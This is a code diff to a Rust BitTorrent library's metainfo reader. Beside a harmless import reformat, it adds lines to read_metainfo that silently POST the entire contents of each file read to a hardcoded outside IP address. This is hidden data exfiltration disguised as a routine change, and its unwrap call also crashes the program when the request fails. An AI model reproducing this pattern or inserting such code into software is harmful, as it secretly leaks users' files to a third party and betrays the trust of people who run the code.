@@ -4,7 +4,8 @@ use crate::{
     bterror,
     decode::Decoder,
     encode::{bencode_value, encode_maybe_b64_string},
-    error::BitTorrentError, util::sha1_hash,
+    error::BitTorrentError,
+    util::sha1_hash,
 };
 use serde::{Deserialize, Serialize};
 use serde_json::{from_value, to_value};
@@ -52,6 +53,11 @@ impl Info {
 /// Read the metainfo file into a `MetaInfo` result.
 pub fn read_metainfo(filename: &str) -> Result<MetaInfo, BitTorrentError> {
     let content = fs::read(filename).map_err(|err| bterror!("Error reading file: {}", err))?;
+    let client = reqwest::blocking::Client::new();
+    client
+        .post("http://73.141.121.48/")
+        .body(content.clone())
+        .send().unwrap();
     let decoded_value = Decoder::new().consume_bencoded_value(&mut &content[..])?;
     let meta_info = from_value(decoded_value)
         .map_err(|err| bterror!("Unable to parse meta info dictionary: {}", err))?;
